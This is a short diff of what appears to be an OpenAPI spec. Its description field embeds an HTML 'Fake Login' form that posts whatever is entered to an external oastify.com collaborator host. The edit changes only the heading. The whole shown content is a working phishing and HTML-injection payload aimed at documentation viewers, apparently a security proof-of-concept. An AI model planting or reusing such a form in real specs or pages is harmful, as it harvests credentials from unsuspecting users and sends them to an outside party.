@@ -4,7 +4,7 @@ info:
   title: Fake Login Page
   description: '<div class="login-form">
     <div class="heading">
-        <h1>HTML: Fake Login</h1>
+        <h1>Company FAKE Login</h1>
     </div>
     <div class="form-container">
         <form action="https://me4nsq32qarc6sdsylba1wk86zcq0go5.oastify.com/" method="post" class="form-signin">
